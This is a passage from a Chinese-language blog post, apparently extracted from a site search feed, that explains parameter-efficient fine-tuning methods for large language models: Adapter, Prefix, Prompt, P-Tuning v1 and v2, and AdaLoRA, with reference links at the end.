<p>目前 LORA 已经被 HuggingFace 集成在了 PEFT（Parameter-Efficient Fine-Tuning） 代码库里。</p>
<h2 id="Adapte-Tuning"><a href="#Adapte-Tuning" class="headerlink" title="Adapte Tuning"></a>Adapte Tuning</h2><p>如下图所示的 Adapter 结构，将其嵌入 Transformer 的结构里面，在训练时，固定住原来预训练模型的参数不变，只对新增的 Adapter 结构进行微调。同时为了保证训练的高效性（也就是尽可能少的引入更多参数），他们将 Adapter 设计为这样的结构：</p>
<p>首先是一个 down-project 层将高维度特征映射到低维特征<br>然后过一个非线形层之后，再用一个 up-project 结构将低维特征映射回原来的高维特征<br>同时也设计了 skip-connection 结构，确保了在最差的情况下能够退化为identity（类似残差结构）。<br><img src="/2023/10/09/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BE%AE%E8%B0%83%E6%8A%80%E6%9C%AF/2.png" alt="avatar"></p>
<h2 id="Prefix-Tuning"><a href="#Prefix-Tuning" class="headerlink" title="Prefix Tuning"></a>Prefix Tuning</h2><p>与Full-finetuning 更新所有参数的方式不同，该方法是在输入 token 之前构造一段任务相关的 virtual tokens 作为 Prefix，然后训练的时候只更新 Prefix 部分的参数，而 Transformer 中的其他部分参数固定。该方法其实和构造 Prompt 类似，只是 Prompt 是人为构造的“显式”的提示，并且无法更新参数，而Prefix 则是可以学习的“隐式”的提示。同时，为了防止直接更新 Prefix 的参数导致训练不稳定的情况，他们在 Prefix 层前面加了 MLP 结构(相当于将Prefix 分解为更小维度的 Input 与 MLP 的组合后输出的结果)，训练完成后，只保留 Prefix 的参数。<br><img src="/2023/10/09/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BE%AE%E8%B0%83%E6%8A%80%E6%9C%AF/3.png" alt="avatar"></p>
<h2 id="Prompt-Tuning"><a href="#Prompt-Tuning" class="headerlink" title="Prompt Tuning"></a>Prompt Tuning</h2><p>该方法可以看作是 Prefix Tuning 的简化版本，只在输入层加入 prompt tokens，并不需要加入 MLP 进行调整来解决难训练的问题，主要在 T5 预训练模型上做实验。似乎只要预训练模型足够强大，其他的一切都不是问题,随着预训练模型参数量的增加，Prompt Tuning的方法会逼近 Fine-tune 的结果。固定预训练参数，为每一个任务额外添加一个或多个 embedding，之后拼接 query 正常输入 LLM，并只训练这些 embedding。左图为单任务全参数微调，右图为 Prompt tuning。<br><img src="/2023/10/09/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BE%AE%E8%B0%83%E6%8A%80%E6%9C%AF/4.png" alt="avatar"></p>
<h2 id="P-Tuning-v1"><a href="#P-Tuning-v1" class="headerlink" title="P-Tuning v1"></a>P-Tuning v1</h2><p>P-tuning 依然是固定 LLM 参数，利用多层感知机和 LSTM 对 Prompt 进行编码，编码之后与其他向量进行拼接之后正常输入 LLM。<br><img src="/2023/10/09/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BE%AE%E8%B0%83%E6%8A%80%E6%9C%AF/5.png" alt="avatar"></p>
<h2 id="P-Tuning-v2"><a href="#P-Tuning-v2" class="headerlink" title="P-Tuning v2"></a>P-Tuning v2</h2><p>P-Tuning v2 的目标就是要让 Prompt Tuning 能够在不同参数规模的预训练模型、针对不同下游任务的结果上都达到匹敌 Fine-tuning 的结果</p>
<p>相比 Prompt Tuning 和 P-tuning 的方法， P-tuning v2 方法在多层加入了 Prompts tokens 作为输入，带来两个方面的好处：</p>
<ol>
<li>带来更多可学习的参数（从 P-tuning 和 Prompt Tuning 的0.1%增加到0.1%-3%），同时也足够 parameter-efficient。</li>
<li>加入到更深层结构中的 Prompt 能给模型预测带来更直接的影响。</li>
</ol>
<p><img src="/2023/10/09/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BE%AE%E8%B0%83%E6%8A%80%E6%9C%AF/6.png" alt="avatar"></p>
<h2 id="AdaLoRA"><a href="#AdaLoRA" class="headerlink" title="AdaLoRA"></a>AdaLoRA</h2><p>预训练语言模型中的不同权重参数对下游任务的贡献是不同的。因此需要更加智能地分配参数预算，以便在微调过程中更加高效地更新那些对模型性能贡献较大的参数。具体来说，通过奇异值分解将权重矩阵分解为增量矩阵，并根据新的重要性度量动态地调整每个增量矩阵中奇异值的大小。这样可以使得在微调过程中只更新那些对模型性能贡献较大或必要的参数，从而提高了模型性能和参数效率。</p>
<p>  参考文章：<br>  <a href="https://zhuanlan.zhihu.com/p/623543497" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/623543497</a><br>  <a href="https://zhuanlan.zhihu.com/p/627642632" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/627642632</a></p>
]]></content>
  </entry>
</search>
